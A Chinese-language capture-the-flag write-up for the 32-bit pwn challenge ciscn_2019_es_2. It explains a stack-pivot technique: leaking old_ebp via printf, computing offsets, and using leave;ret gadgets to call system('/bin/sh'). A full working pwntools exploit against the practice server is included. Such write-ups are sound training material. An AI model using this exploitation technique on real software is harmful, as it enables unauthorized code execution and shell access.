ciscn_2019_es_2

一、前言

这道题是学了栈迁移找的题试试。

二、题目

只有NX保护机制，ida中静态分析下

找到valu函数，发现里面有两个read函数两个printf函数，如果说是普通的栈溢出，一次read函数溢出就行了，而且给出了printf函数%s，一般也是用来泄露地址的,因为并没有开启地址随机化保护，所以我们只需要泄露栈的地址。看一下溢出，0x28的偏移，0x30的大小，所以只有0x8正好用来布置ebp和ret，而且不够我们布置其它操作，所以需要栈转移到更大的空间去布置system

在程序中只找到了system函数地址，找不到’/bin/sh’，所以需要我们布置。

栈迁移需要知道一个可控的地址，这道题中s的地址是可控的，但是地址不知道，所以需要调试配合printf函数泄露出ebp的地址,从而实现栈迁移。

因为printf函数在输出时识别‘0’时截断，所以在前0x28填充时给s填满，并且用send发送payload，这时printf识别不到’0’，会继续打印，所以我们只需要接收这个泄露的地址，就是之前的old_ebp地址。

泄露old_ebp地址：
payload = 0x26*b'a'+2*b'b'		#方便判断接收old_ebp

sh.send(payload)			#sendline会自动在后面加上'\n'，会破坏溢出

sh.recvuntil("bb")		#判断接收old_ebp

ebp_addr = u32(sh.recv(4))
print(hex(ebp_addr))
计算old_ebp和s之间的偏移

在第二次printf函数下断点，调试查看此时栈的布局。此时栈中ebp指向的old_ebp为0xffffd0c8，esp此时为0xffffdo90，所以esp和old_ebp之间的偏移为0x38

再利用第二次read函数打入我们的POP链

打入后的栈如下图(画画技术不太行)

程序进行栈迁移，执行两次leave_ret后程序执行system(‘/bin/sh’)，获得shell。

3、EXP

from pwn import*

sh = remote('node4.buuoj.cn',28093)

leave_addr = 0x080484b8				#寻找的gadget片段
system_addr = 0x08048400			#system函数地址

payload = 0x26*b'a'+2*b'b'			#利用printf泄露old_ebp的地址

sh.send(payload)

sh.recvuntil("bb")

ebp_addr = u32(sh.recv(4))
print(hex(ebp_addr))

payload = b'aaaa'+p32(system_addr)+b'bbbb'+p32(ebp_addr - 0x28)+b'/bin/sh\x00'

payload = payload.ljust(0x28,b'p')			#填充垃圾数据
payload += p32(ebp_addr-0x38)+p32(leave_addr)

sh.sendline(payload)

sh.interactive()

4、总结

栈迁移的核心就是移动esp来控制程序流程
